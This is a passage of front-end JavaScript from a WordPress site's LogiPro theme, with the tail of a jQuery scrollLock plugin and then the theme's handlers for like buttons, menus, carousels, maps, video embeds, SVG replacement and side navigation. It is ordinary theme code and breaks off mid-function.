    n.fn.scrollLock.defaults = t.DEFAULTS;
    n.fn.scrollLock.noConflict = function() {
        return n.fn.scrollLock = f, this
    }
});
//# sourceMappingURL=jquery-scrollLock.min.js.map;
// source --> https://kendrew.ca/wp-content/themes/logipro/scripts/logipro.js
/*jslint browser: true*/
/*jslint white: true */
/*global $,jQuery,ozy_headerType,headerMenuFixed,Parallax,alert,ajaxurl,$OZY_WP_AJAX_URL,$OZY_WP_IS_HOME,$OZY_WP_HOME_URL,addthis*/

/* LogiPro WordPress Theme Main JS File */

/**
 * Call Close Fancybox
 */
function close_fancybox() {
    "use strict";
    jQuery.fancybox.close();
}

/*
Some of dynamic elements like essential grid are not
sizing correctly when you refresh the page and jump to
another tab and back. Following handlers will fix it.
*/
window.onblur = function() {
    jQuery(window).resize();
}
window.onfocus = function() {
    jQuery(window).resize();
}

/**
 * Read cookie
 *
 * @key - Cookie key
 */
function getCookieValue(key) {
    "use strict";
    var currentcookie = document.cookie,
        firstidx, lastidx;
    if (currentcookie.length > 0) {
        firstidx = currentcookie.indexOf(key + "=");
        if (firstidx !== -1) {
            firstidx = firstidx + key.length + 1;
            lastidx = currentcookie.indexOf(";", firstidx);
            if (lastidx === -1) {
                lastidx = currentcookie.length;
            }
            return decodeURIComponent(currentcookie.substring(firstidx, lastidx));
        }
    }
    return "";
}

/**
 * Cookie checker for like system
 *
 * @post_id - WordPress post ID
 */
function check_favorite_like_cookie(post_id) {
    "use strict";
    var str = getCookieValue("post_id");
    if (str.indexOf("[" + post_id + "]") > -1) {
        return true;
    }

    return false;
}

/**
 * Cokie writer for like system
 *
 * @post_id - WordPress post ID
 */
function write_favorite_like_cookie(post_id) {
    "use strict";
    var now = new Date();
    now.setMonth(now.getYear() + 1);
    post_id = "[" + post_id + "]," + getCookieValue("post_id");
    document.cookie = "post_id=" + post_id + "; expires=" + now.toGMTString() + "; path=/; ";
}

/**
 * Like buttons handler
 *
 * @post_id - WordPress post ID
 * @p_post_type
 * @p_vote_type
 * @$obj
 */
function ajax_favorite_like(post_id, p_post_type, p_vote_type, $obj) {
    "use strict";
    if (!check_favorite_like_cookie(post_id)) { //check, if there is no id in cookie
        jQuery.ajax({
            url: ozy_headerType.$OZY_WP_AJAX_URL,
            data: {
                action: 'logipro_ozy_ajax_like',
                vote_post_id: post_id,
                vote_post_type: p_post_type,
                vote_type: p_vote_type
            },
            cache: false,
            success: function(data) {
                //not integer returned, so error message
                if (parseInt(data, 0) > 0) {
                    write_favorite_like_cookie(post_id);
                    jQuery('span', $obj).text(data);
                } else {
                    alert(data);
                }
            },
            error: function(MLHttpRequest, textStatus, errorThrown) {
                alert("MLHttpRequest: " + MLHttpRequest + "\ntextStatus: " + textStatus + "\nerrorThrown: " + errorThrown);
            }
        });
    }
}

function logipro_ozy_ajax_load_more_blog_action() {
    jQuery(".load_more_blog").click(function(e) {

        e.preventDefault();

        jQuery(this).text(jQuery(this).data('loadingcaption'));

        var order = jQuery(this).data("order");
        var orderby = jQuery(this).data("orderby");
        var item_count = jQuery(this).data("item_count");
        var excerpt_length = jQuery(this).data("excerpt_length");
        var category_name = jQuery(this).data("category_name");
        var offset = jQuery(this).data("offset");
        var found = jQuery(this).data("found");
        var layout_type = jQuery(this).data("layout_type");
        var fitRows = jQuery(this).data("fitrows");

        offset = offset + item_count;
        logipro_ozy_ajax_load_more_blog(order, orderby, item_count, category_name, offset, found, jQuery(this), layout_type, fitRows);
        jQuery(this).data("offset", offset);

        return false;

    });
}

/**
 * Popup window launcher
 *
 * @url - Url address for the popup window
 * @title - Popup window title
 * @w - Width of the window
 * @h - Height of the window
 */
function ozyPopupWindow(url, title, w, h) {
    "use strict";
    var left = (screen.width / 2) - (w / 2),
        top = (screen.height / 2) - (h / 2);
    return window.open(url, title, 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width=' + w + ', height=' + h + ', top=' + top + ', left=' + left);
}

/**
 * To check iOS devices and versions
 */
function ozyCheckIsMobile() {
    "use strict";
    return (/Mobi/.test(navigator.userAgent));
}

function ozyCheckMac() {
    "use strict";
    var isMac = /(mac)/.exec(window.navigator.userAgent.toLowerCase());
    return (isMac != null && isMac.length);
}

/**
 * ozy_full_row_fix
 *
 * Set sections to document height which matches with selector
 */
function logipro_ozy_height_fix() {
    "use strict";
    /* Master Slider Template */
    if (jQuery('body.page-template-page-masterslider-full').length) {
        logipro_ozy_full_row_fix_calc('height');
    }
    /* Countdown Page */
    if (jQuery('body.page-template-page-countdown').length) {
        jQuery('#content').height(jQuery(window).height());
    }
}

function logipro_ozy_full_row_fix_calc(height_param) {
    "use strict";
    var header_height = jQuery('#header').height();
    var window_height = (jQuery(window).innerHeight() - ((jQuery(this).outerHeight(true) - jQuery(this).height())));
    if (jQuery('#wpadminbar').length > 0) {
        header_height = header_height + jQuery('#wpadminbar').height();
    }
    jQuery('#main').css(height_param, (window_height - header_height) + 'px');
}

function logipro_ozy_share_button() {
    "use strict";
    jQuery(document).on('click', 'body.single .post-submeta>a:not(.blog-like-link)', function(e) {
        e.preventDefault();
        ozyPopupWindow(jQuery(this).attr('href'), 'Share', 640, 440);
    });
}

var ozy_ticker_containerheight = 0,
    ozy_ticker_numbercount = 0,
    ozy_ticker_liheight, ozy_ticker_index = 1,
    ozy_ticker_timer;

function logipro_ozy_callticker() {
    "use strict";
    jQuery(".ozy-ticker ul").stop().animate({
        "margin-top": (-1) * (ozy_ticker_liheight * ozy_ticker_index)
    }, 1500);
    jQuery('#ozy-tickerwrapper .pagination>a').removeClass('active');
    jQuery('#ozy-tickerwrapper .pagination>a[data-slide="' + (ozy_ticker_index) + '"]').addClass('active'); //bullet active
    if (ozy_ticker_index != ozy_ticker_numbercount - 1) {
        ozy_ticker_index = ozy_ticker_index + 1;
    } else {
        ozy_ticker_index = 0;
    }
    ozy_ticker_timer = setTimeout("ozy_callticker()", 3600);
}

// Function Primary Menu Fix for Mobile Devices
function logipro_ozy_primary_menu_fix() {
    if (!jQuery('body').hasClass('ozy-alternate-menu') && jQuery(window).width() < 1025) {
        jQuery('body').addClass('ozy-alternate-menu ozy-page-locked ozy-menu-script');
    } else if (jQuery('body').hasClass('ozy-menu-script') && jQuery(window).width() > 1025) {
        jQuery('body').removeClass('ozy-alternate-menu ozy-page-locked ozy-menu-script');
    }
}

/* Resets windows scroll position if there is a hash to make it work smooth scroll*/
var windowScrollTop = jQuery(window).scrollTop();
window.scrollTo(0, 0);
setTimeout(function() {
    "use strict";
    window.scrollTo(0, windowScrollTop);
}, 1);

jQuery(window).resize(function() {
    "use strict";

    logipro_ozy_height_fix();

    logipro_ozy_primary_menu_fix();
});

/**
 * logipro_ozy_hash_scroll_fix
 *
 * Check if there is a hash and scrolls to there, onload
 */
function logipro_ozy_hash_scroll_fix() {
    "use strict";
    setTimeout(function() {
        if (window.location.hash) {
            var hash = window.location.hash;
            if (jQuery(hash).length) {
                jQuery('html,body').animate({
                    scrollTop: jQuery(hash).offset().top
                }, 1600, 'easeInOutExpo');
            }
        }
    }, 200);
}

jQuery(window).load(function() {
    "use strict";
    if (jQuery().masonry) {

        /* Search page */
        if (jQuery('body.search-results').length) {
            jQuery('body.search-results .post-content>div').masonry({
                itemSelector: 'article.result',
                gutter: 20
            });
        }
    }

    logipro_ozy_menu_bg_color_fixer();

    /* Row Kenburns Slider */
    jQuery('.smoothslides').each(function() {
        jQuery(jQuery(this)).smoothSlides({
            effectDuration: 5000,
            navigation: false,
            pagination: false,
            matchImageSize: false
        });
    });

    /* Service Box and Service Box Excerpt height fix */
    jQuery('.vc_row .ozy-service-box').equalHeights();
    jQuery('.vc_row .ozy-service-box>.front-face>.excerpt-box').equalHeights();

    /* Fix Request a Rate Form Scroll issue */
    jQuery('#request-a-rate>div').scrollLock();
});

/* Sticky Menu, only works on desktop devices */
function logipro_ozy_menu_bg_color_fixer() {
    "use strict";
    var headerMenuFixed = false;
    if (!jQuery('body').hasClass('force-transparent-menu') && !jQuery('body').hasClass('ozy-menu-script')) {
        if (jQuery(window).scrollTop() >= 0) { //70 previously
            if (!headerMenuFixed) {
                jQuery('body').addClass('ozy-alternate-menu');
            }
        } else {
            jQuery('body').removeClass('ozy-alternate-menu');
            headerMenuFixed = false;
        }
    }
}

jQuery(window).scroll(function() {
    "use strict";
    logipro_ozy_menu_bg_color_fixer();
});

jQuery(document).ready(function($) {
    "use strict";

    logipro_ozy_share_button();

    logipro_ozy_height_fix();

    logipro_ozy_ajax_load_more_blog_action();

    logipro_ozy_hash_scroll_fix();

    logipro_ozy_primary_menu_fix();

    /* Primary Menu */
    $("#top-menu").menumaker({
        format: "multitoggle"
    });

    $('#main-menu-button').click(function(e) {
        e.preventDefault();
        $('body').toggleClass('menu-open');
        $(this).find('p').html($('body').hasClass('menu-open') ? $(this).data('closecaption') : $(this).data('defaultcaption'));
    });

    /* Animsition */
    if (ozy_Animsition.is_active) {
        $(".animsition").animsition({
            inClass: 'fade-in',
            outClass: 'fade-out',
            inDuration: 200,
            outDuration: 200,
            linkElement: '#top-menu li>a:not([target="_blank"]):not([href^="#"])',
            loading: true,
            loadingParentElement: 'body',
            loadingClass: 'cube-loader-wrapper',
            loadingInner: '<div class="loader-box"><div class="loader-cube"></div><div class="loader-cube"></div><div class="loader-cube"></div><div class="loader-cube"></div></div>',
            timeout: false,
            timeoutCountdown: 1000,
            onLoadEvent: true,
            browser: ['animation-duration', '-webkit-animation-duration'],
            overlay: false,
            overlayClass: 'animsition-overlay-slide',
            overlayParentElement: 'body',
            transition: function(url) {
                window.location.href = url;
            }
        });
    }

    /* Menu Link */
    $('#top-menu ul>li>a[href*="#"]:not([href="#"]):not([href="#top-search"]):not(#tracking-form):not(#request-a-rate-button):not(.request-a-rate-button):not([href="#side-menu"]),#content a[href^="#"]:not(.show-more):not([data-vc-container])').click(function(e) {
        var pattern = /^((http|https|ftp):\/\/)/;
        if (pattern.test(this.href)) {
            e.preventDefault();
            if (ozy_click_hash_check(this)) {
                if (ozy_Animsition.is_active) {
                    $('.animsition').animsition('out', $(e.target), ozy_headerType.$OZY_WP_HOME_URL + this.hash);
                } else {
                    window.location = ozy_headerType.$OZY_WP_HOME_URL + this.hash;
                }
            }
        } else if (/#/.test(this.href)) {
            e.preventDefault();
            if (ozy_click_hash_check(this)) {
                if (ozy_Animsition.is_active) {
                    $('.animsition').animsition('out', $(e.target), ozy_headerType.$OZY_WP_HOME_URL + $(this).attr('href'));
                } else {
                    window.location = ozy_headerType.$OZY_WP_HOME_URL + $(this).attr('href');
                }
            }
        } else {
            if (ozy_Animsition.is_active) {
                e.preventDefault();
                $('.animsition').animsition('out', $(e.target), $(this).attr('href'));
            }
        }
    });

    /* Search Button & Stuff */
    $('#close-search-overlay,#main-search-button').click(function(e) {
        e.preventDefault();
        $('body').toggleClass('search-overlay-open');
        $('#search-overlay #search').focus();
    });

    /* Language Switcher */
    $('.lang-switcher').click(function(e) {
        $('body').toggleClass('language-switcher-open');
        e.preventDefault();
    });

    /* Request A Rate Form */
    function call_request_rate_form() {
        $('body').toggleClass('request-a-rate-open');
    }
    $('#request-a-rate-button, .request-a-rate-button, #request-a-rate-close-button').click(function(e) {
        e.preventDefault();
        call_request_rate_form();
        return false;
    });

    /* Tracking Form */
    $('a#tracking-form').click(function(e) {
        e.preventDefault();
        $('body').toggleClass('tracker-form-open');
        return false;
    });

    /* Escape Key */
    $(document).keyup(function(e) {
        if (e.which == 27) {
            $('body').removeClass('search-overlay-open').removeClass('request-a-rate-open').removeClass('menu-open').removeClass('language-switcher-open').removeClass('tracker-form-open');
        }
        e.preventDefault();
    });

    $(document).on("click", function(e) {
        var dropdown_menu_div = $("#drop-menu-wrapper,#main-menu-button");
        if (!dropdown_menu_div.is(e.target) && !dropdown_menu_div.has(e.target).length) {
            if ($('body').hasClass('menu-open')) {
                $('body').removeClass('menu-open');
            }
        }
    });

    /* Close overlay boxes when clicked somewhere on the document, if opened already */
    $(document).on("click", function(e) {
        var tracker_form_elm = $("body.tracker-form-open .primary-menu-bar-wrapper #freevision_tracker_form,body.tracker-form-open .header-menu-wrapper #freevision_tracker_form");
        if (!$('a#tracking-form').is(e.target) && !tracker_form_elm.is(e.target) && !tracker_form_elm.has(e.target).length && tracker_form_elm.is(':visible')) {
            $('body').removeClass('tracker-form-open');
        }
        var lang_switcher_elm = $("body.language-switcher-open span.lang-switcher-dropdown");
        if (!$('span.lang-switcher').is(e.target) && !lang_switcher_elm.is(e.target) && !lang_switcher_elm.has(e.target).length && lang_switcher_elm.is(':visible')) {
            $('body').removeClass('language-switcher-open');
        }
    });
    $('.lang-switcher-dropdown>a').click(function(e) {
        e.preventDefault();
        window.location = $(this).attr('href');
        return false;
    });

    function logipro_ozy_visual_stuff() {
        /* Blog Share Button*/
        $(document).on('click', '.post-submeta>a.post-share', function(e) {
            if ($(this).data('open') !== '1') {
                $(this).data('open', '1').next('div').stop().animate({
                    'margin-left': '0',
                    opacity: 'show'
                }, 300, 'easeInOutExpo');
            } else {
                $(this).data('open', '0').next('div').stop().animate({
                    'margin-left': '30px',
                    opacity: 'hide'
                }, 300, 'easeInOutExpo');
            }
            e.preventDefault();
        });
        $(document).on("click", function(e) {
            var post_share_button = $(".post-submeta>a.post-share");
            if (!post_share_button.is(e.target) && !post_share_button.has(e.target).length) {
                post_share_button.data('open', '0').next('div').stop().animate({
                    'margin-left': '30px',
                    opacity: 'hide'
                }, 300, 'easeInOutExpo');
            }
        });

        /* Tooltip plugin init */
        $(function() {
            $('.tooltip-top').tooltipsy({
                className: 'tooltipsy white',
                offset: [0, 20]
            });
            $('.tooltip').tooltipsy();
        });

        /* Page Share Buttons */
        $('a.page-social-share').on('click', function(event) {
            event.preventDefault();

            $(this).parent().parent().find('a').not('.page-social-share').each(function(index) {
                if (!$(this).hasClass('show')) {
                    $('body').addClass('page-social-share-open');
                    $(this).addClass('show').css('opacity', 0).animate({
                        top: ((index + 1) * 36),
                        opacity: 1
                    }, 50, 'easeInOutExpo');
                } else {
                    $(this).animate({
                        top: 0,
                        opacity: 0
                    }, {
                        duration: 50,
                        easing: 'easeInOutExpo',
                        complete: function() {
                            $('.page-share-buttons a').removeClass('show');
                        }
                    });
                    $('body').removeClass('page-social-share-open');
                }
            });
        });

        $(document).on("click", function(e) {
            if ($('body').hasClass('page-social-share-open')) {
                var sidr_div = $("a.page-social-share");
                if (!sidr_div.is(e.target) && !sidr_div.has(e.target).length && sidr_div.is(':visible')) {
                    $('a.page-social-share').click();
                }
            }
        });

        /* Counter */
        if ('undefined' !== typeof jQuery.fn.waypoint) {
            jQuery('.ozy-counter>.timer').waypoint(function() {
                if (!$(this).hasClass('ran')) {
                    $(this).addClass('ran').countTo({
                        from: $(this).data('from'),
                        to: $(this).data('to'),
                        speed: 5000,
                        refreshInterval: 25,
                        sign: $(this).data('sign'),
                        signpos: $(this).data('signpos')
                    });
                }
            }, {
                offset: '85%'
            });
        }

        /* Flickity News Carousel */
        $('.explore-news').each(function(index, element) {
            $(element).flickity({
                // options
                lazyLoad: true,
                contain: true,
                accessibility: true,
                imagesLoaded: true,
                percentPosition: false,
                prevNextButtons: false, //custom option used
                pageDots: false,
                cellAlign: 'left',
                wrapAround: true
            });
            //Custon Arrows
            var $programs = $(element).flickity({
                prevNextButtons: false,
                pageDots: false
            });
            // Flickity instance
            var flkty = $programs.data('flickity');

            // previous
            $('.button--previous').on('click', function() {
                $programs.flickity('previous');
            });
            // next
            $('.button--next').on('click', function() {
                $programs.flickity('next');
            });
        });

        /* Flickity Testimonial Slider */
        $('.carouselOfImages').each(function(index, element) {
            var $imagesCarousel = $(this).flickity({
                contain: true,
                wrapAround: true,
                pageDots: $(this).data('pagedots'),
                prevNextButtons: $(this).data('prevnextbuttons'),
                groupCells: $(this).data('groupcells'),
                autoPlay: $(this).data('autoplay'),
                friction: 0.3
            });

            function resizeCells() {
                var flkty = $imagesCarousel.data('flickity');
                var $current = flkty.selectedIndex
                var $length = flkty.cells.length
                if ($length < '3') {
                    $imagesCarousel.flickity('destroy');
                }
                $('.carouselOfImages .carouselImage').removeClass("nextToSelected");
                $('.carouselOfImages .carouselImage').eq($current - 1).addClass("nextToSelected");
                if ($current + 1 == $length) {
                    var $endCell = "0"
                } else {
                    var $endCell = $current + 1
                }
                $('.carouselOfImages .carouselImage').eq($endCell).addClass("nextToSelected");
            };

            resizeCells();

            $imagesCarousel.on('scroll.flickity', function() {
                resizeCells();
            });
        });

        /* Flickity Events Slide */
        $('.events-listing').flickity({
            // options
            lazyLoad: true,
            contain: true,
            accessibility: true,
            imagesLoaded: true,
            percentPosition: true,
            prevNextButtons: false,
            pageDots: false,
            cellAlign: 'left',
            wrapAround: true,
            adaptiveHeight: true,
            setGallerySize: false
        });

        if ($('.events-listing').length > 0) {
            var $events = $('.events-listing').flickity({
                prevNextButtons: false,
                pageDots: false
            });
            // Flickity instance
            var flkty = $events.data('flickity');
            // elements
            var $cellButtonGroup = $('.button-group--cells');
            var $cellButtons = $cellButtonGroup.find('.carousel-nav-item');

            // update selected cellButtons
            $events.on('cellSelect.flickity', function() {
                $cellButtons.filter('.is-selected')
                    .removeClass('is-selected');
                $cellButtons.eq(flkty.selectedIndex)
                    .addClass('is-selected');
            });

            // select cell on button click
            $cellButtonGroup.on('click', '.carousel-nav-item', function() {
                var index = $(this).index();
                $events.flickity('select', index);
            });
        }

        /* YouTube Embed */
        $('.oytb-videoWrapper').each(function(index, element) {
            var $poster = $(this);
            var $wrapper = $poster.closest(this);

            $(this).click(function(ev) {
                ev.preventDefault();
                videoPlay($wrapper);
            });

            function videoPlay($wrapper) {
                var $iframe = $wrapper.find('.oytb-js-videoIframe');
                var src = $iframe.data('src');
                $wrapper.addClass('oytb-videoWrapperActive');
                $poster.parent('div').find('.oytb-video-StopButton').show(100, 'easeInOutExpo');
                $iframe.attr('src', src);
            }

            $('.oytb-video-StopButton').click(function() {
                videoStop($wrapper);
            });

            function videoStop($wrapper) {
                if (!$wrapper) {
                    var $wrapper = $('.oytb-js-videoWrapper');
                    var $iframe = $('.oytb-js-videoIframe');
                } else {
                    var $iframe = $wrapper.find('.oytb-js-videoIframe');
                }
                $wrapper.removeClass('oytb-videoWrapperActive');
                $poster.parent('div').find('.oytb-video-StopButton').hide(100, 'easeInOutExpo');
                $iframe.attr('src', '');
            }
        });

        /* Post Slider */
        $('.ozy-post-slider').flickity({
            selectedAttraction: 0.1,
            friction: 0.4,
            prevNextButtons: false,
            cellAlign: 'left',
            contain: false,
            imagesLoaded: true,
            percentPosition: false,
            groupCells: 2
        });

        /* Simple Info Box Equal Height */
        var maxheight = 0;
        $('.vc_row .wpb_wrapper .ozy-simlple-info-box').each(function() {
            maxheight = ($(this).height() > maxheight ? $(this).css('height') : maxheight);
        });
        $('.vc_row .wpb_wrapper .ozy-simlple-info-box').height(maxheight);

        /* Image With Text Block */
        maxheight = 0;
        $('.vc_row .wpb_wrapper .ozy-image-with-text-block').each(function() {
            maxheight = ($(this).height() > maxheight ? $(this).css('height') : maxheight);
        });
        $('.vc_row .wpb_wrapper .ozy-image-with-text-block').height(maxheight);

        /* Custom Buttons */
        $('.ozy-custom_button.ocbtn-6')
            .on('mouseenter', function(e) {
                var parentOffset = $(this).offset(),
                    relX = e.pageX - parentOffset.left,
                    relY = e.pageY - parentOffset.top;
                $(this).find('span').css({
                    top: relY,
                    left: relX
                })
            })
            .on('mouseout', function(e) {
                var parentOffset = $(this).offset(),
                    relX = e.pageX - parentOffset.left,
                    relY = e.pageY - parentOffset.top;
                $(this).find('span').css({
                    top: relY,
                    left: relX
                })
            });
    }

    logipro_ozy_visual_stuff();

    function logipro_ozy_vc_components() {
        /* Google Map */
        if ('undefined' !== typeof jQuery.fn.prettyMaps) {
            $('.ozy-google-map:not(.init-later)').each(function(index, element) {
                $(this).parent().append(
                    $('<div class="gmaps-cover"></div>').click(function() {
                        $(this).remove();
                    })
                );
                $(this).prettyMaps({
                    address: $(this).data('address'),
                    zoom: $(this).data('zoom'),
                    panControl: true,
                    zoomControl: true,
                    mapTypeControl: true,
                    scaleControl: true,
                    streetViewControl: true,
                    overviewMapControl: true,
                    scrollwheel: true,
                    image: $(this).data('icon'),
                    hue: $(this).data('hue'),
                    saturation: $(this).data('saturation'),
                    lightness: $(this).data('lightness')
                });
            });
        }

        /* Multi Google Map */
        if ('undefined' !== typeof jQuery.fn.ozyGmap) {
            $('.ozy-multi-google-map').each(function(index, element) {
                $(this).parent().append(
                    $('<div class="gmaps-cover"></div>').click(function() {
                        $(this).remove();
                    })
                );
                $(this).ozyGmap({
                    dataPath: $(this).data('path'),
                    zoom: $(this).data('zoom'),
                    panControl: true,
                    zoomControl: true,
                    mapTypeControl: true,
                    scaleControl: true,
                    streetViewControl: true,
                    overviewMapControl: true,
                    scrollwheel: true,
                    image: $(this).data('icon'),
                    hue: $(this).data('hue'),
                    saturation: $(this).data('saturation'),
                    lightness: $(this).data('lightness')
                });
            });
        }

        /* News Ticker Box */
        $(".ozy-news-box-ticker").each(function() {
            $(this).bootstrapNews({
                newsPerPage: $(this).data('item_per_page'),
                autoplay: $(this).data('auto_play'),
                pauseOnHover: true,
                direction: $(this).data('direction'),
                newsTickerInterval: $(this).data('ticker_interval')
            });
        });
        if ($(".ozy-news-box-ticker").length > 0) {
            $(window).resize();
        }

        /* Counter */
        if ('undefined' !== typeof jQuery.fn.waypoint) {
            jQuery('.ozy-counter>.timer').waypoint(function() {
                if (!$(this).hasClass('ran')) {
                    $(this).addClass('ran').countTo({
                        from: $(this).data('from'),
                        to: $(this).data('to'),
                        speed: 5000,
                        refreshInterval: 25,
                        sign: $(this).data('sign'),
                        signpos: $(this).data('signpos')
                    });
                }
            }, {
                offset: '85%'
            });
        }

        /* Typewriter */
        $(".typing-box").each(function(index, element) {
            var options = {
                typeSpeed: $(this).data('typespeed'),
                startDelay: $(this).data('startdelay'),
                backSpeed: $(this).data('backspeed'),
                backDelay: $(this).data('backdelay'),
                loop: $(this).data('loop'),
                strings: $.parseJSON(ozyTypeWriterData[$(this).data('path')])
            };
            $(this).typed(options);
        });

        /* Team Member Extended Content */
        if ($('.ozy-team_member_simple.has-extended-content').length) {
            $('body').append('<div id="side-extended-content-overlay"><div id="side-extended-content"><button type="button" class="close oic-cancel"></button><div class="content content-font"></div></div></div>');

            $('.ozy-team_member_simple.has-extended-content a.show-more').click(function(e) {
                e.preventDefault();
                var $this = $(this).parents('div.ozy-team_member_simple');
                $this.find('figure>a').click(function(e) {
                    e.preventDefault();
                });
                var $source = $this.find('.extended-content'),
                    $target = $('#side-extended-content'),
                    $width = window.innerWidth;
                if ($width < 620) {
                    $width = $width - 20;
                } else {
                    $width = 600;
                }
                $target.css('width', $width + 'px');
                $('#side-extended-content-overlay').stop().css('left', '0px').animate({
                    opacity: 1
                }, 200, 'easeInOutExpo', function() {
                    $('html').css('overflow', 'hidden');
                    $target.find('div.content').html($source.html());
                    $target.show().stop().animate({
                        right: 0,
                        opacity: 1
                    }, 500, 'easeInOutExpo');
                });

                function close_extended_box() {
                    $target.stop().animate({
                        right: '-' + $width + 'px',
                        opacity: 0
                    }, 500, 'easeInOutExpo', function() {
                        $target.hide();
                        $('html,body').css('overflow', 'auto');
                        $('#side-extended-content-overlay').stop().css('left', '100%').animate({
                            opacity: 1
                        }, 200, 'easeInOutExpo');
                    });
                }

                $(window).resize(function() {
                    close_extended_box();
                });

                $('#side-extended-content-overlay #side-extended-content button.close').click(function() {
                    close_extended_box();
                });

                $('#side-extended-content-overlay').on('click', function(e) {
                    var side_extended_content_div = $('#side-extended-content');
                    if (!side_extended_content_div.is(e.target) && !side_extended_content_div.has(e.target).length) {
                        e.preventDefault();
                        close_extended_box();
                    }
                });
            });
        }

        /* Team Member Extended Content (Lightbox)*/
        if ($('.ozy-team_member.has-extended-content').length) {
            $('.ozy-team_member.has-extended-content a').click(function(e) {
                e.preventDefault();
                var $this = $(this).parents('div.ozy-team_member');
                $this.find('figure>a').click(function(e) {
                    e.preventDefault();
                });
                var $source = $this.find('.extended-content'),
                    $target = $('#side-extended-content');
                $.fancybox({
                    minWidth: 940,
                    maxWidth: 940,
                    maxHeight: 640,
                    padding: 0,
                    scrolling: 'no',
                    'content': $source.html()
                });
            });
        }

        /* Row Scrolling Effect */
        $('.wpb_row[data-bgscroll]').each(function() {
            var params = $(this).data('bgscroll').split(',');
            $(this).ozyBgScroller({
                direction: params[0],
                step: params[1]
            });
        });

        /* TTA Margin Bottom Fix */
        $('.vc_tta.vc-no-bottom-margin').parents('.vc_tta-container').css('margin', '0');
    }

    logipro_ozy_vc_components();

    /* Check if section ID and menu target is match */
    $('.wpb_row').bind('inview', function(event, visible) {
        var $elm = $('#top-menu>div>div>ul>li>a[href*="#' + $(this).attr('id') + '"]:not([href="#"])').parent();
        if (visible == true) {
            $elm.addClass('current_page_item');
        } else {
            $elm.removeClass('current_page_item');
        }
    });

    /* Contact Form 7 Date Time Picker */
    if ('undefined' !== typeof jQuery.fn.datetimepicker) {
        $('input.datetimepicker').datetimepicker();
    }

    function ozy_click_hash_check($this) {
        if (location.pathname.replace(/^\//, '') == $this.pathname.replace(/^\//, '') || location.hostname == $this.hostname) {

            var target = $($this.hash);
            target = target.length ? target : $('[name=' + $this.hash.slice(1) + ']');
            if (target.length) {
                $('html,body').animate({
                    scrollTop: target.offset().top
                }, 1600, 'easeInOutExpo');
                return false;
            }
        }
        return true;
    }

    /* Waypoint animations */
    if ('undefined' !== typeof jQuery.fn.waypoint) {
        jQuery('.ozy-waypoint-animate').waypoint(function() {
            jQuery(this).addClass('ozy-start-animation');
        }, {
            offset: '85%'
        });
    }

    /* Blog post like function */
    $(document).on('click', '.blog-like-link', function(e) {
        ajax_favorite_like($(this).data('post_id'), 'like', 'blog', this);
        e.preventDefault();
    });

    /* FancyBox initialization */
    $(".wp-caption>p").click(function() {
        jQuery(this).prev('a').attr('title', jQuery(this).text()).click();
    }); //WordPress captioned image fix
    $(".fancybox, .wp-caption>a, .single-image-fancybox a").fancybox({
        beforeLoad: function() {},
        padding: 0,
        helpers: {
            title: {
                type: 'inside'
            },
            buttons: {}
        }
    });
    $('.fancybox-media').fancybox({
        openEffect: 'none',
        closeEffect: 'none',
        helpers: {
            title: {
                type: 'inside'
            },
            media: {}
        }
    });

    /* Back to top button */
    var pxScrolled = 200;
    var duration = 500;

    $(window).scroll(function() {
        if ($(this).scrollTop() > pxScrolled) {
            $('.logipro-btt-container').css({
                'bottom': '40px',
                'transition': '.3s'
            });
        } else {
            $('.logipro-btt-container').css({
                'bottom': '-100px'
            });
        }
    });

    $('.top').click(function() {
        $('body,html').animate({
            scrollTop: 0
        }, duration);
    })
});

/**
 * SVG replacer. Replaces <img src=svg/> into SVG element.
 *
 * Credits: How to change color of SVG image using CSS (jQuery SVG image replacement)?, http://stackoverflow.com/q/11978995
 */
jQuery(function() {
    jQuery('img.svg').each(function() {
        var $img = jQuery(this);
        var imgID = $img.attr('id');
        var imgClass = $img.attr('class');
        var imgURL = $img.attr('src');

        jQuery.get(imgURL, function(data) {
            // Get the SVG tag, ignore the rest
            var $svg = jQuery(data).find('svg');

            // Add replaced image's ID to the new SVG
            if (typeof imgID !== 'undefined') {
                $svg = $svg.attr('id', imgID);
            }
            // Add replaced image's classes to the new SVG
            if (typeof imgClass !== 'undefined') {
                $svg = $svg.attr('class', imgClass + ' replaced-svg');
            }

            // Remove any invalid XML tags as per http://validator.w3.org
            $svg = $svg.removeAttr('xmlns:a');

            // Check if the viewport is set, else we gonna set it if we can.
            if (!$svg.attr('viewBox') && $svg.attr('height') && $svg.attr('width')) {
                $svg.attr('viewBox', '0 0 ' + $svg.attr('height') + ' ' + $svg.attr('width'))
            }

            // Replace image with new SVG
            $img.replaceWith($svg);

        }, 'xml');

    });
});

jQuery(function($) {
    if ($('body.use-side-navigation').length) {

        $('body').append('<nav id="section-menu" class="content-font-family"><ul></ul></nav>');

        var html = $('html');
        var viewport = $(window);
        var viewportHeight = viewport.height();

        var scrollMenu = $('#section-menu');
        var timeout = null;

        function menuFreeze() {
            if (timeout !== null) {
                scrollMenu.removeClass('freeze');
                clearTimeout(timeout);
            }

            timeout = setTimeout(function() {
                scrollMenu.addClass('freeze');
            }, 2000);
        }
        scrollMenu.mouseover(menuFreeze);

        /* Build the Scroll Menu based on Sections .scroll-item */

        var sectionsHeight = {},
            viewportheight, i = 0;
        var scrollItem = $('.vc_row.wpb_row[data-rowcaption][id]');
        var bannerHeight;

        function sectionListen() {
            viewportHeight = viewport.height();
            bannerHeight = (viewportHeight);
            $('.vc_row.wpb_row[data-rowcaption][id]').addClass('resize');
            scrollItem.each(function() {
                sectionsHeight[this.id] = $(this).offset().top;
            });
        }
        sectionListen();
        viewport.resize(sectionListen);
        viewport.bind('orientationchange', function() {
            sectionListen();
        });

        var count = 0;

        scrollItem.each(function() {
            var anchor = $(this).attr('id');
            var title = $(this).data('rowcaption');
            count++;
            $('#section-menu ul').append('<li><a id="nav_' + anchor + '" href="#' + anchor + '"><span>' + count + '</span> ' + title + '</a></li>');
        });

        function menuListen() {
            var pos = $(this).scrollTop();
            pos = pos + viewportHeight * 0.625;
            for (i in sectionsHeight) {
                if (sectionsHeight[i] < pos) {
                    $('#section-menu a').removeClass('active');
                    $('#section-menu a#nav_' + i).addClass('active');
                } else {
                    $('#section-menu a#nav_' + i).removeClass('active');
                }
            }
        }
        scrollMenu.css('margin-top', scrollMenu.height() / 2 * -1);

        /* Smooth Scroll for Anchor Links and URL refresh */

        scrollMenu.find('a').click(function() {
            var href = $.attr(this, 'href');
            $('html,body').animate({
                scrollTop: $(href).offset().top
            }, 500, function() {
                window.location.hash = href;
            });
            return false;
        });

        /* Fire functions on Scroll Event */

